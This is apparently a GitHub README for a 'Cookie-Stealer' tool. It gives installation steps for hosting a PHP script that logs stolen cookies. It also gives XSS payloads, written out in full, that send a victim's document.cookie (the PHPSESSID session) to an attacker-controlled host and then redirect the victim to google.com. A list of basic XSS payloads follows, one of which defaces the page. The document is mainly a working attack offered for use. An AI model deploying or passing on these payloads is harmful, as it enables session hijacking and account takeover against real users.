
# Cookie-Stealer

### This Basic Script Let you get "Take" The Cookie of user From **HTTP** Site...

<h4>Installation</h4>

**Linux**
```
1. git clone https://github.com/mahmoudashraf1344/Cookie-Stealer.git
2. mkdir /var/www/html/cookies
3. cp Cookie-Stealer /var/www/html/cookies
4. cd /var/www/html/Cookie-Stealer

```
##### Alert **You can do what you want i just did a Directory Called **cookies** because just for Organizing my own files..**
</br>
<h2>How To Use It</h2>

1. The File Called **cookiesteal.php** has a parameter **c** the **document.cookie** is for seaching in web app doc to get us the cookie "**PHPSESSID**"
2. Example of xss inject `<script>window.location = "http://Your Domain or Localhost/cookie/cookiesteal.php?c=" + document.cookie;</script>`
3. How to inject A **Javascript** Payload in inpute? For an Example `<script>window.location = "http://192.168.1.3/cookie/cookiesteal.php?c=" + document.cookie;</script>`
4. after injected the xss payload it will take the user to `google.com` page you can change it whatever you want the original is`header("Location: http://www.google.com/");` i can change it to facebook like this `header("Location: http://www.facebook.com/");`
5. After User or "Victim" click or submit the link the cookie session will get it in `log.txt` file...

</br>

### XSS Payload For Education:->?>

```
- <script>alert(1)</script>
- <img src=x onmouseover=confirm(1)>
- <svg onload=prompt("xss")>
- ' onerror='alert(1)'
- <script>document.body.innerHTML="Hacked By Me"</script>
```
